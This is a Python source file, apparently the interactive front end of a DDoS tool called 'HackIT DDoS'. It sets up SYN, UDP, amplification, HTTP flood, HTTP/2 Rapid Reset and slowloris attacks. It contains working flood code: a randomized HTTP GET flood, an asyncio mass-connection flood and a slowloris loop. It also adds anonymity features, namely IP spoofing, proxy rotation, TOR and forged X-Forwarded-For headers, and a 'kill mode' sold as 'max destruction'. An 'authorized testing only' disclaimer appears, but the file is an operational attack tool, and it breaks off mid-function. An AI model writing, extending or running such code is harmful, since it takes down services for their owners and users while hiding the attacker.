"""
HackIT DDoS Stress Testing Suite — Interactive Terminal
========================================================
Three-layer architecture with expert-grade masking & evasion.

Usage: hackit ddos
       Then follow the interactive prompts.
"""

import os
import sys
import json
import time
import subprocess
import tempfile
import signal
import socket
import shutil
import re
import random
import urllib.request
import click
from pathlib import Path

from hackit.ui import (
    _colored, GREEN, RED, YELLOW, BLUE, CYAN, MAGENTA,
    B_GREEN, B_RED, B_CYAN, B_YELLOW, B_WHITE,
    DIM, WHITE, BOLD,
)

ENGINE_DIR = Path(__file__).parent
C_DIR = ENGINE_DIR / "c"
GO_DIR = ENGINE_DIR / "go"
GO_BINARY = ENGINE_DIR / "engine_ddos"
PYTHON_DIR = ENGINE_DIR / "python_support"

def _vis(s):
    return re.sub(r'\x1b\[[0-9;]*m', '', s)

def _vis_w(s):
    """Visual width accounting for double-width characters."""
    s = _vis(s)
    w = 0
    for ch in s:
        cp = ord(ch)
        if 0x1F000 <= cp <= 0x1FFFF:
            w += 2
        elif 0x2E80 <= cp <= 0x9FFF:
            w += 2
        else:
            w += 1
    return w

def _make_box(title, lines, color=B_WHITE, title_color=B_CYAN, width=70):
    t = color
    out = f'\n  {t}┌{"─"*width}┐{DIM}'
    ct = _vis(title)
    out += f'\n  {t}│{title_color}{ct:^{width}}{t}│{DIM}'
    out += f'\n  {t}├{"─"*width}┤{DIM}'
    for line in lines:
        v = _vis_w(line)
        pad = width - v
        if pad < 0:
            line = _vis(line)[:width]
            pad = 0
        out += f'\n  {t}│{DIM}{line}{" "*pad}{t}│{DIM}'
    out += f'\n  {t}└{"─"*width}┘{DIM}'
    return out



_c = B_CYAN
_r = B_RED
_g = B_GREEN
_y = YELLOW
_d = DIM
_w = B_WHITE

BANNER = (
    f"\n  {_c}┌{'─'*49}┐{_d}"
    f"\n  {_c}║  {_r}┌───┐ ┌───┐ ┌───┐ ┌───┐ ┌───┐ ┌───┐{_d}            {_c}║{_d}"
    f"\n  {_c}║  {_r}│ H │ │ A │ │ C │ │ K │ │ I │ │ T │{_d}            {_c}║{_d}"
    f"\n  {_c}║  {_r}└───┘ └───┘ └───┘ └───┘ └───┘ └───┘{_d}            {_c}║{_d}"
    f"\n  {_c}║  {_g}┌───┐ ┌───┐ ┌───┐ ┌───┐ ┌───┐{_d}                  {_c}║{_d}"
    f"\n  {_c}║  {_g}│ D │ │ D │ │ O │ │ S │ │ . │{_d}                  {_c}║{_d}"
    f"\n  {_c}║  {_g}└───┘ └───┘ └───┘ └───┘ └───┘{_d}                  {_c}║{_d}"
    f"\n  {_c}├{'─'*49}┤{_d}"
    f"\n  {_c}║  {_r}HACKIT{_d} {_g}DDoS{_d} {_y}V2.1{_d} {_c}|{_d}  {_y}Authorized Testing Only{_d}    {_c}║{_d}"
    f"\n  {_c}└{'─'*49}┘{_d}"
)

HELP_TEXT = _make_box(
    "COMMAND REFERENCE",
    [
        "",
        f"  {B_RED}TARGET SETUP{DIM}",
        f"    {GREEN}target{DIM} <ip/domain>     Target IP or domain",
        f"    {GREEN}p{DIM} <port>              Port  {DIM}(default: 80){DIM}",
        "",
        f"  {B_RED}ATTACK MODES — LAYER 3 (NETWORK){DIM}",
        f"    {GREEN}mode syn{DIM}              SYN flood  {DIM}(TCP handshake saturate){DIM}",
        f"    {GREEN}mode udp{DIM}              UDP flood  {DIM}(random payload ×65000){DIM}",
        f"    {GREEN}mode icmp{DIM}             ICMP echo flood  {DIM}(ping of death){DIM}",
        f"    {GREEN}mode ack{DIM}              ACK flood  {DIM}(bypass stateful firewall){DIM}",
        f"    {GREEN}mode rst{DIM}              RST flood  {DIM}(kill existing connections){DIM}",
        f"    {GREEN}mode land{DIM}             LAND attack  {DIM}(src=dst loopback crash){DIM}",
        "",
        f"  {B_RED}ATTACK MODES — LAYER 4 (TRANSPORT){DIM}",
        f"    {GREEN}mode dns{DIM}              DNS amplification  {DIM}(×70 ANY query){DIM}",
        f"    {GREEN}mode ntp{DIM}              NTP amplification  {DIM}(×5560 monlist){DIM}",
        f"    {GREEN}mode amp{DIM}              Multi-amp  {DIM}(DNS+NTP+Memcached){DIM}",
        "",
        f"  {B_RED}ATTACK MODES — LAYER 7 (APPLICATION){DIM}",
        f"    {GREEN}mode http{DIM}             HTTP GET/POST flood  {DIM}(proxy rotation){DIM}",
        f"    {GREEN}mode https{DIM}            HTTPS flood  {DIM}(TLS renegotiation){DIM}",
        f"    {GREEN}mode h2{DIM}               HTTP/2 Rapid Reset  {DIM}(CVE-2023-44487){DIM}",
        f"    {GREEN}mode slowloris{DIM}        Slowloris  {DIM}(hold connections open){DIM}",
        f"    {GREEN}mode bypass{DIM}           Stateful bypass  {DIM}(TCP handshake flood){DIM}",
        "",
        f"  {B_RED}ATTACK MODES — CPU EXHAUSTION{DIM}",
        f"    {GREEN}mode slowread{DIM}          Slow Read  {DIM}(exhaust connection pool){DIM}",
        f"    {GREEN}mode hashcollision{DIM}     HashDoS  {DIM}(PHP/Node hash O(n²)){DIM}",
        f"    {GREEN}mode rangeflood{DIM}        Range Flood  {DIM}(Apache CPU+mem){DIM}",
        f"    {GREEN}mode sslreneg{DIM}          SSL Reneg  {DIM}(asymmetric crypto spam){DIM}",
        "",
        f"  {B_RED}ATTACK MODES — MASSIVE{DIM}",
        f"    {GREEN}mode all{DIM}              ALL L3+L4+L7  {DIM}(14 vectors simultaneous){DIM}",
        f"    {GREEN}mode kill{DIM}             KILL MODE  {DIM}(max destruction + pattern){DIM}",
        f"    {GREEN}mode mix{DIM}              Custom ratio  {DIM}(use mix command){DIM}",
        "",
        f"  {B_YELLOW}ATTACK PARAMETERS{DIM}",
        f"    {GREEN}time{DIM} <sec>            Duration  {DIM}(default: 30){DIM}",
        f"    {GREEN}rate{DIM} <pps>            Packets/sec  {DIM}(default: 100000){DIM}",
        f"    {GREEN}threads{DIM} <n>           Worker count  {DIM}(default: 1024, max: 4096){DIM}",
        f"    {GREEN}jitter{DIM} <us>           Inter-packet delay  {DIM}(0=no limit){DIM}",
        f"    {GREEN}size{DIM} <bytes>          UDP payload size  {DIM}(max 65000){DIM}",
        f"    {GREEN}mix{DIM} U:S:H:A           Mix ratio  {DIM}(UDP:SYN:HTTP:AMP){DIM}",
        f"    {GREEN}pattern{DIM} <type>        Attack pattern  {DIM}(square/sawtooth/random){DIM}",
        f"    {GREEN}recon{DIM} on/off          Pre-attack port scan  {DIM}(off){DIM}",
        "",
        f"  {B_YELLOW}MASKING & ANONYMITY{DIM}",
        f"    {GREEN}mask{DIM} on/off           Proxy rotation  {DIM}(auto-fetch 200+ proxies){DIM}",
        f"    {GREEN}spoof{DIM} on/off          IP spoofing  {DIM}(raw socket, needs root){DIM}",
        f"    {GREEN}proxy{DIM} <url>           Custom proxy  {DIM}(socks5://...){DIM}",
        f"    {GREEN}tor{DIM}                   TOR network  {DIM}(identity rotation){DIM}",
        f"    {GREEN}profile{DIM}               WAF + ports detection",
        "",
        f"  {B_YELLOW}ADVANCED{DIM}",
        f"    {GREEN}h2-streams{DIM} <n>        H2 concurrent streams  {DIM}(default: 500){DIM}",
        f"    {GREEN}interfaces{DIM} <ifs>      Multi-NIC bond  {DIM}(eth0,eth1){DIM}",
        f"    {GREEN}core-pin{DIM}              Pin to CPU cores",
        f"    {GREEN}output{DIM} <dir>          Save attack report",
        "",
        f"  {B_YELLOW}ACTIONS{DIM}",
        f"    {GREEN}run{DIM}                   EXECUTE ATTACK",
        f"    {GREEN}show{DIM}                  Show current config",
        f"    {GREEN}clear{DIM}                 Clear terminal",
        f"    {GREEN}help{DIM}                  This reference",
        f"    {GREEN}exit{DIM}                  Quit",
        "",
        f"  {B_RED}SPECIAL COMMAND{DIM}",
        f"    {GREEN}gui{DIM}                   Open GUI dashboard  {DIM}(tkinter){DIM}",
        "",
        f"  {B_GREEN}EXAMPLES{DIM}",
        f"    {DIM}> target 192.168.1.100 mode kill mask on spoof on time 3600 threads 64 run{DIM}",
        f"    {DIM}> target example.com mode all mix 25:25:25:25 verbose on run{DIM}",
        f"    {DIM}> mode syn rate 500000 time 60 threads 16 run{DIM}",
        "",
        f"  {RED}─── DISCLAIMER ───{DIM}",
        f"  {YELLOW}For authorized testing only. User assumes all liability.{DIM}",
    ],
    width=72,
)




class DDoSConfig:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.method = "syn"
        self.time = 30
        self.rate = 100000
        self.threads = 1024
        self.mask = False
        self.spoof = False
        self.jitter = 0
        self.size = 1024
        self.verbose = False
        self.proxy = ""
        self.tor = False
        self.profile = False
        self.adaptive = False
        self.core_pin = False
        self.switch = False
        self.interfaces = ""
        self.h2_streams = 100
        self.dpdk = False
        self.xdp = False
        self.output = ""
        self.mix = "25:25:25:25"  # UDP:SYN:HTTP:AMP ratio (KILL mode)
        self.pattern = "square"   # square|sawtooth|random|constant
        self.recon = False        # pre-attack reconnaissance

    def show(self):
        lines = [
            f"  {B_CYAN}Current Configuration{DIM}",
            f"  {'─'*60}",
            f"  {B_YELLOW}Target{DIM}    : {self.target or RED+'NOT SET'+DIM}",
            f"  {B_YELLOW}Port{DIM}      : {self.port}",
            f"  {B_YELLOW}Mode{DIM}      : {self.method}",
            f"  {B_YELLOW}Time{DIM}      : {self.time}s",
            f"  {B_YELLOW}Rate{DIM}      : {self.rate} pps",
            f"  {B_YELLOW}Threads{DIM}   : {self.threads}",
            f"  {B_YELLOW}Jitter{DIM}    : {self.jitter}µs" if self.jitter else "",
            f"  {B_YELLOW}Size{DIM}      : {self.size} bytes",
            f"  {B_YELLOW}Mask{DIM}      : {GREEN+'ON'+DIM if self.mask else RED+'OFF'+DIM}",
            f"  {B_YELLOW}Spoof{DIM}     : {GREEN+'ON'+DIM if self.spoof else RED+'OFF'+DIM}",
            f"  {B_YELLOW}Proxy{DIM}     : {self.proxy or 'none'}",
            f"  {B_YELLOW}TOR{DIM}       : {GREEN+'ON'+DIM if self.tor else RED+'OFF'+DIM}",
            f"  {B_YELLOW}Adaptive{DIM}  : {GREEN+'ON'+DIM if self.adaptive else RED+'OFF'+DIM}",
            f"  {B_YELLOW}Core-Pin{DIM}  : {GREEN+'ON'+DIM if self.core_pin else RED+'OFF'+DIM}",
            f"  {B_YELLOW}Auto-Switch{DIM}: {GREEN+'ON'+DIM if self.switch else RED+'OFF'+DIM}",
            f"  {B_YELLOW}Mix{DIM}       : {self.mix} (UDP:SYN:HTTP:AMP)" if self.method in ('kill', 'all', 'mix') else "",
            f"  {B_YELLOW}Pattern{DIM}   : {self.pattern}",
            f"  {B_YELLOW}Recon{DIM}     : {GREEN+'ON'+DIM if self.recon else RED+'OFF'+DIM}",
        ]
        return '\n'.join(l for l in lines if l)

    def validate(self):
        if not self.target:
            return False, "No target set. Use: target <ip/domain>"
        if self.threads > 4096:
            self.threads = 4096
        if self.rate > 5000000:
            self.rate = 5000000
        return True, "ready"

    def to_go_cfg(self, spoof_pool):
        ko_modes = ("all", "kill", "land", "slowloris", "amp", "mix")
        is_all = self.method in ko_modes
        mode = "http" if self.method == "https" else self.method
        if self.method in ko_modes:
            mode = self.method
        capped = min(self.threads, 4096)
        return {
            "target": self.target,
            "port": self.port,
            "method": mode,
            "workers": capped,
            "rate_limit": self.rate,
            "duration": self.time,
            "spoof_ip": spoof_pool[0] if spoof_pool and self.spoof else "",
            "spoof_pool": spoof_pool if self.spoof else [],
            "proxy_list": [],
            "mask": self.mask,
            "jitter": self.jitter,
            "interfaces": [i.strip() for i in self.interfaces.split(',') if i.strip()] if self.interfaces else [],
            "auto_switch": self.switch or is_all,
            "adaptive_rate": self.adaptive or is_all,
            "core_pin": self.core_pin,
            "xdp_enable": self.xdp,
            "dpdk_enable": self.dpdk,
            "h2_concurrent_streams": self.h2_streams,
            "dpi_fragment_count": 4,
            "mix_ratio": self.mix if self.method in ("kill", "all", "mix") else "25:25:25:25",
            "size": self.size,
            "method_list": [
                'syn', 'udp', 'ack', 'rst', 'icmp', 'dns', 'ntp',
                'http', 'h2', 'bypass', 'morph'
            ] if (self.switch or is_all) else [],
            "tor_proxy": "",
            "recon": self.recon,
            "pattern": self.pattern,
        }


PROMPT = f"  {B_YELLOW}Input Target:{DIM} "


def print_banner():
    print(BANNER)
    print()
    print(f"  {DIM}[example]{DIM} > {GREEN}target{DIM} {CYAN}domain/ip{DIM} {DIM}[command]{DIM}  or  {GREEN}gui{DIM}  for dashboard")
    print(f"  {DIM}[type '{CYAN}help{DIM}' for help]{DIM}")
    print()


_CHAIN_CMDS = [
    "target", "p", "port", "mode", "time", "rate", "threads", "w",
    "jitter", "size", "mask", "spoof", "verbose", "proxy", "tor",
    "profile", "adaptive", "core-pin", "switch", "interfaces",
    "h2-streams", "dpdk", "xdp", "output", "mix", "pattern", "recon",
    "run", "start", "go", "show", "help", "gui", "clear", "exit", "banner",
]

def _chain_parse(line):
    segs = []
    i = 0
    parts = line.split()
    while i < len(parts):
        tok = parts[i].lower()
        if tok in _CHAIN_CMDS:
            cmd = tok
            vals = []
            i += 1
            while i < len(parts) and parts[i].lower() not in _CHAIN_CMDS:
                vals.append(parts[i])
                i += 1
            segs.append((cmd, ' '.join(vals)))
        else:
            segs.append(('target', parts[i]))
            i += 1
    return segs

def _exec_one(cfg, action, arg):
    if action == "exit":
        return "exit"
    if action == "help":
        print(HELP_TEXT)
    elif action == "show":
        print()
        print(cfg.show())
        print()
    elif action == "clear":
        os.system('clear' if os.name == 'posix' else 'cls')
    elif action == "banner":
        print_banner()
    elif action == "target":
        if arg:
            cfg.target = arg
            print(f"  {GREEN}Target set to:{DIM} {arg}")
        else:
            print(f"  {RED}Usage: target <ip/domain>{DIM}")
    elif action in ("p", "port"):
        try:
            cfg.port = int(arg.split()[0])
            print(f"  {GREEN}Port set to:{DIM} {cfg.port}")
        except (ValueError, IndexError):
            print(f"  {RED}Usage: p <port_number>{DIM}")
    elif action == "mode":
        modes = ["syn", "udp", "ack", "rst", "icmp", "dns", "ntp",
                 "http", "https", "h2", "bypass", "morph", "all", "kill",
                 "land", "slowloris", "amp", "mix", "quic", "grpc", "ws", "wp"]
        if arg in modes:
            cfg.method = arg
            if arg == "all":
                cfg.switch = True
                cfg.adaptive = True
                print(f"  {GREEN}Mode set to:{DIM} {arg} ({BOLD}ALL methods + auto-switch + adaptive{DIM})")
            else:
                print(f"  {GREEN}Mode set to:{DIM} {arg}")
        else:
            print(f"  {RED}Valid modes:{DIM} {', '.join(modes)}")
    elif action == "time":
        try:
            cfg.time = max(1, int(arg.split()[0]))
            print(f"  {GREEN}Duration set to:{DIM} {cfg.time}s")
        except (ValueError, IndexError):
            print(f"  {RED}Usage: time <seconds>{DIM}")
    elif action == "rate":
        try:
            cfg.rate = max(1, int(arg.split()[0]))
            print(f"  {GREEN}Rate set to:{DIM} {cfg.rate} pps")
        except (ValueError, IndexError):
            print(f"  {RED}Usage: rate <pps>{DIM}")
    elif action in ("threads", "w"):
        try:
            cfg.threads = max(1, min(int(arg.split()[0]), 4096))
            print(f"  {GREEN}Threads set to:{DIM} {cfg.threads}")
            if int(arg.split()[0]) > 256:
                print(f"  {YELLOW}[!] Capped to 256 max{DIM}")
        except (ValueError, IndexError):
            print(f"  {RED}Usage: threads <number>{DIM}")
    elif action == "jitter":
        try:
            cfg.jitter = max(0, int(arg.split()[0]))
            print(f"  {GREEN}Jitter set to:{DIM} {cfg.jitter}us")
        except (ValueError, IndexError):
            print(f"  {RED}Usage: jitter <microseconds>{DIM}")
    elif action == "size":
        try:
            cfg.size = max(64, int(arg.split()[0]))
            print(f"  {GREEN}Packet size set to:{DIM} {cfg.size} bytes")
        except (ValueError, IndexError):
            print(f"  {RED}Usage: size <bytes>{DIM}")
    elif action == "mask":
        if arg in ("on", "off"):
            cfg.mask = arg == "on"
            print(f"  {GREEN}Masking {arg}{DIM}")
        else:
            print(f"  {RED}Usage: mask on|off{DIM}")
    elif action == "spoof":
        if arg in ("on", "off"):
            cfg.spoof = arg == "on"
            print(f"  {GREEN}IP spoofing {arg}{DIM}")
        else:
            print(f"  {RED}Usage: spoof on|off{DIM}")
    elif action == "verbose":
        if arg in ("on", "off"):
            cfg.verbose = arg == "on"
        else:
            cfg.verbose = not cfg.verbose
        print(f"  {GREEN}Verbose {GREEN+'ON' if cfg.verbose else RED+'OFF'}{DIM}")
    elif action == "proxy":
        cfg.proxy = arg
        cfg.mask = True
        print(f"  {GREEN}Proxy set:{DIM} {arg}")
    elif action == "tor":
        cfg.tor = not cfg.tor
        cfg.mask = cfg.tor or cfg.mask
        print(f"  {GREEN}TOR {GREEN+'ON' if cfg.tor else RED+'OFF'}{DIM}")
    elif action == "profile":
        cfg.profile = not cfg.profile
        print(f"  {GREEN}Profiling {GREEN+'ON' if cfg.profile else RED+'OFF'}{DIM}")
    elif action == "adaptive":
        cfg.adaptive = not cfg.adaptive
        print(f"  {GREEN}Adaptive rate {GREEN+'ON' if cfg.adaptive else RED+'OFF'}{DIM}")
    elif action == "core-pin":
        cfg.core_pin = not cfg.core_pin
        print(f"  {GREEN}Core pinning {GREEN+'ON' if cfg.core_pin else RED+'OFF'}{DIM}")
    elif action == "switch":
        cfg.switch = not cfg.switch
        print(f"  {GREEN}Auto-switch {GREEN+'ON' if cfg.switch else RED+'OFF'}{DIM}")
    elif action == "interfaces":
        cfg.interfaces = arg
        print(f"  {GREEN}Interfaces set:{DIM} {arg}")
    elif action == "h2-streams":
        try:
            cfg.h2_streams = max(1, int(arg.split()[0]))
            print(f"  {GREEN}H2 streams set to:{DIM} {cfg.h2_streams}")
        except (ValueError, IndexError):
            print(f"  {RED}Usage: h2-streams <number>{DIM}")
    elif action == "dpdk":
        cfg.dpdk = not cfg.dpdk
        print(f"  {GREEN}DPDK {GREEN+'ON' if cfg.dpdk else RED+'OFF'}{DIM}")
    elif action == "xdp":
        cfg.xdp = not cfg.xdp
        print(f"  {GREEN}XDP {GREEN+'ON' if cfg.xdp else RED+'OFF'}{DIM}")
    elif action == "output":
        cfg.output = arg
        print(f"  {GREEN}Report output:{DIM} {arg}")
    elif action == "mix":
        if arg:
            cfg.mix = arg
            parts = [int(x) for x in arg.split(":") if x.strip().isdigit()]
            total = sum(parts) if parts else 0
            if total != 100:
                print(f"  {YELLOW}[!] Warning: ratios sum to {total}%, not 100%{DIM}")
            print(f"  {GREEN}Mix ratio set:{DIM} {arg} (UDP:SYN:HTTP:AMP)")
        else:
            print(f"  {GREEN}Current mix:{DIM} {cfg.mix}")
    elif action == "pattern":
        patterns = ["square", "sawtooth", "random", "constant"]
        if arg in patterns:
            cfg.pattern = arg
            print(f"  {GREEN}Pattern set to:{DIM} {arg}")
        else:
            print(f"  {RED}Valid patterns:{DIM} {', '.join(patterns)}")
    elif action == "recon":
        cfg.recon = not cfg.recon
        print(f"  {GREEN}Pre-attack recon {GREEN+'ON' if cfg.recon else RED+'OFF'}{DIM}")
    elif action == "gui":
        try:
            from hackit.ddos.gui import launch_gui
            launch_gui()
        except ImportError as e:
            print(f"  {RED}[!] GUI unavailable: {e}{DIM}")
            print(f"  {YELLOW}[!] Install tkinter: sudo apt install python3-tk{DIM}")
        except Exception as e:
            print(f"  {RED}[!] GUI error: {e}{DIM}")
    elif action in ("run", "start", "go"):
        valid, msg = cfg.validate()
        if not valid:
            print(f"  {RED}{msg}{DIM}")
            return
        execute_attack(cfg)
        print()
    else:
        print(f"  {RED}Unknown: {action}{DIM}")

def interactive_loop(cfg: DDoSConfig):
    while True:
        try:
            cmd = input(PROMPT).strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {_colored('[!] Exiting.', YELLOW)}")
            break
        if not cmd:
            continue
        segs = _chain_parse(cmd)
        for action, arg in segs:
            r = _exec_one(cfg, action, arg)
            if r == "exit":
                return


def execute_attack(cfg: DDoSConfig):
    from hackit.ddos.masking import MaskingEngine, TorManager

    mask = MaskingEngine()
    profiler_obj = None
    report = None
    spoof_ips = []

    if cfg.profile:
        sys.path.insert(0, str(PYTHON_DIR))
        from target_profiler import TargetProfiler
        print(f"\n  {B_YELLOW}[*] Profiling target...{DIM}")
        profiler_obj = TargetProfiler(cfg.target)
        profiled = profiler_obj.full_profile()
        print(f"  {CYAN}IP{DIM}      : {profiled.ip or 'unresolved'}")
        print(f"  {CYAN}Server{DIM}  : {profiler_obj.profile.server_header or 'unknown'}")
        if profiled.waf_detected:
            print(f"  {RED}WAF{DIM}     : {', '.join(profiled.waf_detected)}")
        open_ports = [p for p, s in profiled.port_status.items() if s == 'open']
        if open_ports:
            print(f"  {CYAN}Open{DIM}    : {', '.join(map(str, sorted(open_ports)[:8]))}")
        strategy = profiler_obj.suggest_attack_strategy()
        print(f"  {GREEN}Strategy{DIM}: {strategy['reason']}")

    if cfg.recon and not cfg.profile:
        print(f"\n  {B_YELLOW}[*] Pre-attack reconnaissance...{DIM}")
        open_ports = []
        for p in [21,22,23,25,53,80,110,143,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,5985,6379,8080,8443,9000,9200,27017]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                if s.connect_ex((cfg.target, p)) == 0:
                    open_ports.append(p)
                s.close()
            except:
                pass
        if open_ports:
            print(f"  {CYAN}Open ports found:{DIM} {', '.join(map(str, open_ports))}{DIM}")
            print(f"  {GREEN}[+] Attack will target ALL open ports simultaneously{DIM}")
        else:
            print(f"  {YELLOW}[!] No open ports detected, using configured port {cfg.port}{DIM}")
            open_ports = [cfg.port]
        cfg._recon_ports = open_ports

    _build_engines(not cfg.verbose)

    if cfg.spoof:
        spoof_ips = mask.generate_spoof_pool(10000)
        if cfg.verbose:
            print(f"  {DIM}[*] Generated {len(spoof_ips)} spoof IPs{DIM}")
    else:
        spoof_ips = mask.generate_spoof_pool(100)

    tor_proc = None
    proxy_urls = []
    if cfg.mask:
        if not cfg.proxy:
            import threading as _thr
            _result = []
            def _fetch():
                _result.append(mask.fetch_proxies_from_sources())
            _t = _thr.Thread(target=_fetch, daemon=True)
            _t.start()
            sys.stdout.write(f"  {CYAN}[*] Fetching proxies{DIM}")
            sys.stdout.flush()
            _waited = 0
            while _t.is_alive() and _waited < 30:
                _t.join(0.5)
                _waited += 0.5
                sys.stdout.write(".")
                sys.stdout.flush()
            if _t.is_alive():
                print(f" {YELLOW} timed out, starting{DIM}")
            else:
                fetched = _result[0] if _result else 0
                if fetched > 0:
                    print(f" {GREEN} {fetched} loaded{DIM}")
                else:
                    print(f" {YELLOW} none, direct{DIM}")
        if cfg.proxy:
            mask.add_proxy(cfg.proxy)
        for p in mask.proxies[:100]:
            proxy_urls.append(p.url)
        if cfg.tor and not proxy_urls:
            tm = TorManager()
            if tm.start():
                proxy_urls.append(tm.get_proxy_url())
                print(f"  {GREEN}[+] TOR proxy ready{DIM}")
                tor_proc = tm

    if cfg.tor and not proxy_urls:
        print(f"  {CYAN}[*] Starting TOR...{DIM}")
        tm = TorManager()
        if tm.start():
            print(f"  {GREEN}[+] TOR ready{DIM} — 127.0.0.1:9050")
            tor_proc = tm
            proxy_urls.append(tm.get_proxy_url())
        else:
            print(f"  {YELLOW}[!] TOR unavailable{DIM}")

    go_cfg = cfg.to_go_cfg(spoof_ips)
    if proxy_urls:
        go_cfg["proxy_list"] = proxy_urls
    if tor_proc:
        go_cfg["tor_proxy"] = tor_proc.get_proxy_url()
    if cfg.verbose:
        print()
        print(f"  {DIM}Config: {json.dumps(go_cfg, indent=2)}{DIM}")
    print()

    sys.path.insert(0, str(PYTHON_DIR))
    from report_engine import ReportEngine
    report = ReportEngine(cfg.target, cfg.method)

    kill_mode = cfg.method == 'kill'
    disp_method = f"{B_RED}KILL-MODE{DIM}" if kill_mode else f"{YELLOW}{cfg.method.upper()}{DIM}"
    print(f"  {RED}╔{'═'*68}╗{DIM}")
    print(f"  {RED}║{DIM}  {B_RED}ATTACK IN PROGRESS{DIM}  "
          f"{CYAN}{cfg.target}:{cfg.port}{DIM}  "
          f"{disp_method}{DIM}  "
          f"{GREEN}{cfg.time}s{DIM}  "
          f"{BOLD}{cfg.rate} pps{DIM}  "
          f"Pattern:{cfg.pattern}{DIM}  "
          f"{RED}║{DIM}")
    print(f"  {RED}╚{'═'*68}╝{DIM}")

    if kill_mode:
        print(f"  {RED}[KILL] Multi-vector multi-port attack:{DIM}")
        print(f"    {RED}SYN{DIM} | {RED}UDP{DIM} | {RED}FRAG{DIM} | {RED}HTTP{DIM} | {RED}AMP{DIM} | {RED}SLOW{DIM} | {RED}SSL{DIM}")
        print(f"    {DIM}Mix: {cfg.mix} | Pattern: {cfg.pattern}{DIM}")
        print()

    fd, cfg_path = tempfile.mkstemp(suffix='.json', prefix='ddos_')
    try:
        with os.fdopen(fd, 'w') as f:
            json.dump(go_cfg, f)

        engine_bin = str(GO_BINARY)
        if not os.path.exists(engine_bin):
            print(f"  {YELLOW}[!] Engine binary not found{DIM}")
            return

        env = os.environ.copy()
        env['LD_LIBRARY_PATH'] = str(C_DIR / 'build') + ':' + str(C_DIR) + ':' + env.get('LD_LIBRARY_PATH', '')
        env['PATH'] = str(GO_DIR / 'build') + ':' + env.get('PATH', '')

        err_log_path = os.path.join(tempfile.gettempdir(), f'hackit_ddos_{os.getpid()}.err')
        err_log = open(err_log_path, 'w')
        proc = subprocess.Popen(
            [engine_bin, cfg_path],
            stdout=subprocess.PIPE, stderr=err_log,
            text=True, bufsize=1, env=env,
        )

        start_time = time.time()
        total_sent = 0
        peak_rate = 0

        py_total = 0
        py_active = 0
        py_active = 0

        if cfg.method in ('http', 'https', 'kill'):
            from threading import Thread
            def py_flood():
                nonlocal py_total, py_active
                import urllib.request
                py_active = 1
                url = f"http://{cfg.target}:{cfg.port}/"
                if cfg.method == 'https' or cfg.port == 443:
                    url = f"https://{cfg.target}:{cfg.port}/"
                else:
                    url = f"http://{cfg.target}:{cfg.port}/"
                uas = [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1',
                    'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) Mobile/15E148',
                    'Mozilla/5.0 (Linux; Android 14) Chrome/120.0.6099.43 Mobile',
                ]
                paths = ['/', '/index.html', '/admin', '/wp-admin', '/login', '/api/v1/data', '/.env']
                t_end = time.time() + cfg.time
                while time.time() < t_end and proc.poll() is None:
                    try:
                        import random
                        p = random.choice(paths)
                        req = urllib.request.Request(url + p, headers={
                            'User-Agent': random.choice(uas),
                            'Accept': '*/*',
                            'Cache-Control': 'no-cache',
                            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
                        })
                        resp = urllib.request.urlopen(req, timeout=5)
                        resp.read()
                        resp.close()
                        py_total += 1
                    except Exception:
                        py_total += 1
                    finally:
                        time.sleep(0.001)
                py_active = 0
            t = Thread(target=py_flood, daemon=True)
            t.start()

        if cfg.method == 'kill':
            def async_mass():
                nonlocal py_total, py_active
                try:
                    import asyncio, random as rnd
                    async def mass_connect(sem, target, port, duration):
                        nonlocal py_total
                        t_end = asyncio.get_event_loop().time() + duration
                        while asyncio.get_event_loop().time() < t_end and proc.poll() is None:
                            async with sem:
                                try:
                                    reader, writer = await asyncio.wait_for(
                                        asyncio.open_connection(target, port, ssl=(port == 443)),
                                        timeout=5
                                    )
                                    ua = ''.join(rnd.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=rnd.randint(20,40)))
                                    xff = f"{rnd.randint(1,255)}.{rnd.randint(0,255)}.{rnd.randint(0,255)}.{rnd.randint(0,255)}"
                                    request = (
                                        f"GET /?{rnd.randint(0,999999)} HTTP/1.1\r\n"
                                        f"Host: {target}\r\n"
                                        f"User-Agent: {ua}\r\n"
                                        f"Accept: */*\r\n"
                                        f"Connection: keep-alive\r\n"
                                        f"X-Forwarded-For: {xff}\r\n"
                                        f"\r\n"
                                    )
                                    writer.write(request.encode())
                                    await asyncio.wait_for(writer.drain(), timeout=2)
                                    try:
                                        await asyncio.wait_for(reader.read(1024), timeout=2)
                                    except:
                                        pass
                                    try:
                                        writer.close()
                                        await writer.wait_closed()
                                    except:
                                        pass
                                    py_total += 1
                                except:
                                    py_total += 1
                            await asyncio.sleep(0.001)
                    sem = asyncio.Semaphore(2000)
                    asyncio.run(mass_connect(sem, cfg.target, cfg.port, cfg.time))
                except ImportError:
                    pass
                py_active = 0
            t2 = Thread(target=async_mass, daemon=True)
            t2.start()
            py_active = 1

        if cfg.method == 'kill':
            def slow_loris_py():
                nonlocal py_total, py_active
                py_active += 1
                t_end = time.time() + cfg.time
                while time.time() < t_end and proc.poll() is None:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(10)
                        s.connect((cfg.target, cfg.port))
                        s.send(b"GET / HTTP/1.1\r\nHost: " + cfg.target.encode() + b"\r\n")
                        for i in range(100):
                            if proc.poll() is not None:
                                break
                            s.send(f"X-Slow-{i}: {'A' * 512}\r\n".encode())
                            time.sleep(0.01)
                        s.close()
                    except:
                        time.sleep(0.05)
                py_active -= 1
            t3 = Thread(target=slow_loris_py, daemon=True)
            t3.start()

        rtt_baseline = None
        rtt_escalated = False
        blocked_count = 0
        if cfg.method in ('http', 'https', 'kill'):
            def rtt_monitor():
                nonlocal rtt_baseline, rtt_escalated, blocked_count
                import urllib.request
                t_end = time.time() + cfg.time
                while time.time() < t_end and proc.poll() is None:
                    try:
                        url = f"http://{cfg.target}:{cfg.port}/"
                        if cfg.port == 443:
                            url = f"https://{cfg.target}:{cfg.port}/"
                        t0 = time.time()
